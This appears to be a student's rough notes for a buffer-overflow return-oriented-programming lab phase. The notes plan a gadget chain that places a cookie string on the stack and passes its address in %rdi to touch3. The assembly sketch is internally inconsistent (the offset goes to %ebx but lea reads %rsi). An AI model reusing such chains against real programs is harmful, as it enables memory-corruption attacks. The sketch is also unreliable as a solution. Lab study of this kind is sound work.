
the key point is to construct byte representation of 59b997fa on the stack and %rsp add the offset , then pass the address to %rdi

1. where to get %rsp address
2. after get the %rsp address, how to construct the byte representation of 59b997fa and store it on the stack
3. how to pass the address to %rdi
4. call touch3

answer:
1. the address where overflow happens is the address of %rsp
2. then move %rsp to %rax
3. then move %rax to %rdi
4. in order to get the addr, we use "lea",which add_xy shows

``` asm
popq %rax

mov %eax, %edx // from pdf "review the effect a movl instruction has on the upper 4 bytes of a register"
mov %edx, %ecx // it means when this hapeen to a 64-bit register, the upper 4bytes(32 bits) are zeroed out
mov %ecx, %ebx // in order to use lea

mov %rsp, %rax
mov %rax, %rdi // %rsp start from here

lea (%rdi, %rsi, 1), %rax

mov %rax, %rdi // move the address of string to %rdi

// call touch3

// the ascii code of string, where %rsp - 32
```



